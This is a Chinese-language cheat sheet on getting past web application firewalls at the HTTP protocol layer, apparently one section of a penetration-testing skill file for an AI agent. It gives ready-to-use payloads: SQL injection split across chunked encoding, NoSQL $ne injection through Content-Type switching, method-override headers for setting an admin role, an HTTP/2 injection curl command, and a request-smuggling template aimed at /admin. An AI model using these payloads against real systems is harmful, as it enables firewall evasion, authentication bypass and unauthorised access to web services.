# HTTP 协议层绕过
## 2.1 分块传输编码（Chunked Transfer Encoding）

WAF 可能不完整解析分块请求：

```http
POST /api/login HTTP/1.1
Transfer-Encoding: chunked

3
pas
5
sword
1
=
5
admin
1
'
3
 OR
3
 '1
4
'='1
0

```

## 2.2 Content-Type 切换

WAF 通常只检查特定 Content-Type 的请求体：

```bash
# JSON → URL 编码（如果后端都接受）
Content-Type: application/x-www-form-urlencoded
password[$ne]=&username=admin

# URL 编码 → JSON
Content-Type: application/json
{"password": {"$ne": ""}}

# 使用非标准 Content-Type
Content-Type: text/plain
Content-Type: application/xml
Content-Type: multipart/form-data
```

## 2.3 HTTP 方法切换

```bash
# WAF 可能只检查 GET/POST
# 尝试 PUT/PATCH/DELETE/OPTIONS
curl -X PUT "http://TARGET/api/user" -d '{"role":"admin"}'

# 方法覆盖
curl -X POST "http://TARGET/api" -H "X-HTTP-Method-Override: PUT"
curl -X POST "http://TARGET/api" -H "X-Method-Override: DELETE"
```

## 2.4 HTTP/2 特性利用

```bash
# HTTP/2 的伪头部可能不被 WAF 检查
# 使用 h2c（HTTP/2 cleartext）升级
curl --http2 "http://TARGET/?id=1' OR '1'='1"

# HTTP/2 CRLF 注入
# H2 允许在 header value 中包含 \r\n
```

## 2.5 HTTP 请求走私

如果前端（WAF/CDN）和后端 HTTP 解析不一致：

```http
POST / HTTP/1.1
Content-Length: 6
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
...
```
→ 详细走私技术见 `cache-poisoning-smuggling` skill
